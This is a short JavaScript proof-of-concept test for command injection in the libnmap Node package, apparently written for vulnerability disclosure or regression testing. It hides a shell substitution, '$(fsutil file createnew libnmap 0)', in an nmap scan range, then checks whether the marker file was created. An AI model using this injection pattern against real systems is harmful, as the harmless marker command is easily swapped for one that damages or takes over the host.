// test("Command Injection in libnmap", (done) => {
//   expect.assertions(2);
  const nmap = require("libnmap");
  const fs = require("fs");
  const path = "./libnmap";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  const opts = {
    range: ["scanme.nmap.org", "x.x.$(fsutil file createnew libnmap 0)"],
  };
  nmap.scan(opts, function (err, report) {
    file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
    fs.unlink(path, function (err) {
//       done();
    });
  });
// });
